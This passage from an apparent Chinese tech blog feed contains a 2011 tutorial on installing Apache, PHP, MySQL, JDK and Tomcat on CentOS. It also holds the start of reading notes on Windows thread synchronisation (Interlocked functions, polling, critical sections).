&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;yum&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;httpd&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="n"&gt;mysql&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;manual&lt;/span&gt; &lt;span class="n"&gt;mod_ssl&lt;/span&gt; &lt;span class="n"&gt;mod_perl&lt;/span&gt; &lt;span class="n"&gt;mod_auth_mysql&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mcrypt&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;gd&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mbstring&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ldap&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;pear&lt;/span&gt; &lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xmlrpc&lt;/span&gt; &lt;span class="n"&gt;mysql&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;connector&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;odbc&lt;/span&gt; &lt;span class="n"&gt;mysql&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;devel&lt;/span&gt; &lt;span class="n"&gt;libdbi&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;dbd&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2. 配置 Apache+php+mysql&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 设置 apache 为自启动 chkconfig httpd on&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mysql 服务 chkconfig –-add mysqld&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mysqld 服务 chkconfig mysqld on&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 自启动 httpd 服务 service httpd start&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 自启动 mysqld 服务 service mysqld start&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="tomcat"&gt; 二、安装和配置 Tomcat：&lt;/h2&gt;
&lt;p&gt;1. 安装 JDK：&lt;/p&gt;
&lt;p&gt; 为了默认使用 Sun 的 javac 作为 Java 的编译器，首先删除 CentOS 系统默认的 Java 编译器 --gcj。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 查看 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt; &lt;span class="o"&gt;~&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;rpm&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;qa&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="n"&gt;gcj&lt;/span&gt;
&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;1.5.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;gcj&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;1.5.0.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;29.1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;el6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i686&lt;/span&gt;
&lt;span class="n"&gt;libgcj&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;4.4.4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;13.&lt;/span&gt;&lt;span class="n"&gt;el6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i686&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 卸载 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt; &lt;span class="o"&gt;~&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;rpm&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;1.5.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;gcj&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;1.5.0.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;29.1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;el6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i686&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;nodeps&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt; &lt;span class="o"&gt;~&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;rpm&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="n"&gt;libgcj&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;4.4.4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;13.&lt;/span&gt;&lt;span class="n"&gt;el6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i686&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;nodeps&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 检测 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt; &lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;java&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 会出现 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;No&lt;/span&gt; &lt;span class="n"&gt;such&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;directory&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 表示卸载成功 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 安装 jdk&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 从 Jdk 官网下载安装包，如 :&lt;code&gt;jdk-6u27-linux-i586-rpm.bin&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;P&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="err"&gt; 由于我的 &lt;/span&gt;&lt;span class="n"&gt;CentOS&lt;/span&gt;&lt;span class="err"&gt; 没有图形界面，下载不方便，&lt;/span&gt;
&lt;span class="err"&gt; 我是先在 &lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="err"&gt; 上访问 &lt;/span&gt;&lt;span class="n"&gt;JDK&lt;/span&gt;&lt;span class="err"&gt; 官网下载安装包，&lt;/span&gt;
&lt;span class="err"&gt; 然后再用 &lt;/span&gt;&lt;span class="n"&gt;Winscp&lt;/span&gt;&lt;span class="err"&gt; 传到 &lt;/span&gt;&lt;span class="n"&gt;CentOS&lt;/span&gt;&lt;span class="err"&gt; 的 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 比如安装包保存在 /opt/tmp&lt;/p&gt;
&lt;p&gt; 跳到该目录添加可执行的权限，并执行 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;chmod&lt;/span&gt; &lt;span class="mi"&gt;777&lt;/span&gt; &lt;span class="n"&gt;jdk&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6u27&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;linux&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i586&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rpm&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jdk&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6u27&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;linux&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i586&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rpm&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt; 添加环境变量 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;vim /etc/profile&lt;/p&gt;
&lt;p&gt; 添加以下内容：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;export&lt;/span&gt; &lt;span class="n"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jdk1&lt;/span&gt;&lt;span class="mf"&gt;.6.0&lt;/span&gt;&lt;span class="n"&gt;_27&lt;/span&gt;
&lt;span class="n"&gt;export&lt;/span&gt; &lt;span class="n"&gt;JAVA_BIN&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jdk1&lt;/span&gt;&lt;span class="mf"&gt;.6.0&lt;/span&gt;&lt;span class="n"&gt;_27&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;
&lt;span class="n"&gt;export&lt;/span&gt; &lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;
&lt;span class="n"&gt;export&lt;/span&gt; &lt;span class="n"&gt;CLASSPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tools&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 保存后，执行 java -version 如果有类似以下显示，则表示安装成功：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;java&lt;/span&gt; &lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="s"&gt;"1.6.0_27"&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2. 安装 Tomcat：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 从 Tomcat 官网下载 安装包，如：apache-tomcat-7.0.22.tar.gz&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 把该压缩包拷贝到 /usr/local&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;cp&lt;/span&gt; &lt;span class="n"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;7.0.22&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tar&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gz&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 跳转到 /usr/local，并解压压缩包 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;
&lt;span class="n"&gt;tar&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;zxvf&lt;/span&gt; &lt;span class="n"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;7.0.22&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tar&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gz&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 把解压出来的目录改名为 tomcat, 并删除拷贝过来的压缩包 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;rm&lt;/span&gt; &lt;span class="n"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;7.0.22&lt;/span&gt; &lt;span class="n"&gt;tomcat&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 执行 /usr/local/tomcat/bin/startup.sh ，自动添加环境变量，&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 测试 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 访问 &lt;a href="http://localhost:8080"&gt;http://localhost:8080&lt;/a&gt;，出现 tomcat 默认页面，则表示 tomcat 安装成功 &lt;/p&gt;
&lt;p&gt;3. 配置 Tomcat 为开机自启动：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 添加开机 daomon 脚本 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 把 /usr/local/tomcat/bin/catalina.sh 拷贝到 /etc/init.d，并命名为 tomcat&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;cp&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;catalina&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tomcat&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 在 /etc/init.d/tomcat 添加内容：&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/bin/sh&lt;/span&gt;
&lt;span class="c"&gt;# chkconfig: 2345 10 90&lt;/span&gt;
&lt;span class="c"&gt;# description:Tomcat service&lt;/span&gt;
&lt;span class="c"&gt;# Licensed to the Apache Software Foundation (ASF) under one or more&lt;/span&gt;

……

&lt;span class="c"&gt;# $Id: catalina.sh 1073891 2011-02-23 19:23:59Z markt $&lt;/span&gt;
&lt;span class="c"&gt;# ------------------------------------------------------------------------&lt;/span&gt;

&lt;span class="nv"&gt;CATALINA_HOME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/tomcat 
&lt;span class="nv"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/jdk1.6.0_23

……
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 添加 tomcat 服务 &lt;/p&gt;
&lt;p&gt;chkconfig --add tomcat
service tomcat stop
service tomcat start
chkconfig tomcat on&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 搞定！！&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sat, 12 Nov 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-11-12:blog/2011/11/12/centosxia-an-zhuang-apachephpmysql-tomcat/</guid><category>linux</category><category>centos</category><category>apache</category><category>php</category><category>mysql</category><category>tomcat</category></item><item><title>《Windows核心编程》读书笔记3--线程同步</title><link>http://www.goorockey.com/blog/2011/09/05/windowshe-xin-bian-cheng-du-shu-bi-ji-3-xian-cheng-tong-bu/</link><description>
&lt;h2 id="_1"&gt; 原子操作 &lt;/h2&gt;
&lt;p&gt; 能调用的原子操作 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;LONG&lt;/span&gt; &lt;span class="nf"&gt;InterlockedExchangeAdd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PLONG&lt;/span&gt; &lt;span class="n"&gt;plAddend&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LONG&lt;/span&gt; &lt;span class="n"&gt;Increment&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;LONG&lt;/span&gt; &lt;span class="nf"&gt;InterlockedExchange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PLONG&lt;/span&gt; &lt;span class="n"&gt;plTarget&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LONG&lt;/span&gt; &lt;span class="n"&gt;lValue&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="nf"&gt;InterlockedExchangePointer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PVOID&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;ppvTarget&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;pvValue&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="nf"&gt;InterlockedCompareExchange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PLONG&lt;/span&gt; &lt;span class="n"&gt;plDestination&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LONG&lt;/span&gt; &lt;span class="n"&gt;lExchange&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LONG&lt;/span&gt; &lt;span class="n"&gt;lComparand&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="nf"&gt;InterlockedCompareExchangePointer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PVOID&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;ppvDestination&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;pvExchange&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;pvComparand&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;!--more--&gt;
&lt;h2 id="_2"&gt; 以查询方式同步 &lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;volatile&lt;/span&gt; &lt;span class="n"&gt;BOOL&lt;/span&gt; &lt;span class="n"&gt;g_fFinishedCalculation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FALSE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;WINAPI&lt;/span&gt; &lt;span class="nf"&gt;WinMain&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;CreateThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;RecalcFunc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="err"&gt;…&lt;/span&gt;

    &lt;span class="c1"&gt;//Wait for the recalculation to complete. &lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;g_fFinishedCalculation&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="err"&gt;…&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;DWORD&lt;/span&gt; &lt;span class="n"&gt;WINAPI&lt;/span&gt; &lt;span class="nf"&gt;RecalcFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;pvParam&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;//Perform the recalculation. &lt;/span&gt;
    &lt;span class="err"&gt;…&lt;/span&gt;

    &lt;span class="n"&gt;g_fFinishedCalculation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 查询的线程一直处于可调度状态，浪费 CPU 时间 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 如果 WinMain 的线程优先级比 ReclcFunc 的线程要高，则 g_fFinishedCalculation 永远不会被置为 TRUE。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="critical95section"&gt; 关键代码段 Critical_Section&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 使用前调用 InitializeCriticalSection 进行初始化，使用后用 DeleteCriticalSection 释放资源 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 在指向同一个 Critical_Section 的 EnterCriticalSection 和 LeaveCriticalSection 之间的代码，不会被多个线程同时调用 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 同一个线程多次重入 EnterCriticalSection 和 LeaveCriticalSection 之间的代码不会发生死锁。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 如下面代码不会有死锁：&lt;/p&gt;
